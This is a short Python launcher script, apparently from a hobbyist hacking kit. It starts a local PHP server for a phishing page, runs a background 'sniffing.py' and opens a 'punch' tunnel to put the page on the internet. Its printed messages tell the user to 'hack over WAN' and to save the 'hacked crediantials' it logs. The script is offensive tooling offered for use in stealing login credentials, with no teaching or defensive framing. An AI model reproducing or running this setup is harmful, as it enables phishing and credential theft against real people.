#!/usr/bin/env python
#written by mrAnonymous
#if u want null this over Wan use punch tunnel

import time
import os
import subprocess
import sys

Green="\033[1;33m"
Blue="\033[1;34m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"
Purple="\033[0;35m"

time.sleep(2)
os.system('clear')
os.system('cat data.txt > data.txt')
os.system('xterm -T "Php local server" -e "php -S 127.0.0.1:80" &')
os.system('chmod -R 777 sniffing.py')
subprocess.call('python sniffing.py &',shell=True)
os.system("")
os.system('xterm -T "punch server WAN" -e "cd punch-server && ./punch http 80" &')
print("             "+Purple+" SERVER IS ACTIVE "+Reset+" \n")
print("NOW access ur phishing page here http://localhost/ in localy and use punch link to hack over WAN")
print("Dont forget to save ur hacked logs!! if u run this script next time will reset all ur hacked crediantials")

 
